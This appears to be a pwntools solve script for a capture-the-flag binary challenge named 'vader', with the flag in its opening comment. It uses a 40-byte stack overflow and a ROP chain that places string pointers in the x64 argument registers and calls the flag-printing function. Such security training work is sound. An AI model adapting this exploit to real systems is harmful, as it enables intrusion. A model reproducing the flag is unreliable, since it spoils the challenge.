# flag - shctf{th3r3-1s-n0-try}

from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
		
gdbscript = '''
init-peda
b *0x000000000040146b
c

'''.format(**locals())

exe = "./vader"
elf = context.binary = ELF(exe, checksec=False)

context.log_level = "info"

io = start()

def exploit():
    """
    Triggers a buffer overflow vulnerability to send a poisoned buffer that contains a ROP chain
    The ROP chain will arrange the required registries for the "vader" function according to x64 linux calling conventions
    Vader function requires the following arguments in order to print the flag - 
    vader("DARK","S1D3","OF","TH3","FORC3" )
    linux x64 calling conventions - RDI, RSI, RDX, RCX, R8, R9
    """

    offset = b'A'*40 

    pop_rdi = p64(0x000000000040165b) # pop rdi, ret
    pop_rsi_r15 = p64(0x0000000000401659) # pop rsi, pop r15, ret
    pop_rcx_rdx = p64(0x00000000004011cd) # pop rcx, pop rdx, ret
    pop_r9_r8 = p64(0x00000000004011d7) # pop r9, pop r8, ret
    junk = p64(0xdeadbeefcafebabe) 

    dark = p64(0x402104) # pointer to "DARK"
    side = p64(0x4021b4) # pointer to "S1D3"
    of = p64(0x402266) # pointer to "OF"
    the = p64(0x402315) # pointer to "TH3"
    force = p64(0x4023c3) # pointer to "FORC3"

    vader = p64(0x000000000040146b) # vader function address

    rop = offset
    rop += pop_rdi + dark # RDI = *DARK
    rop += pop_rsi_r15 + side + junk # RSI = *SID3, R15 = 0xdeadbeefcafebabe
    rop += pop_rcx_rdx + the + of # RCX = *TH3, RDX = OF
    rop += pop_r9_r8 + junk + force # R9 = 0xdeadbeefcafebabe, R8 = *FORC3
    rop += vader

    io.sendline(rop)
    io.interactive()


def main():
	exploit()


if __name__ == '__main__':
	main()
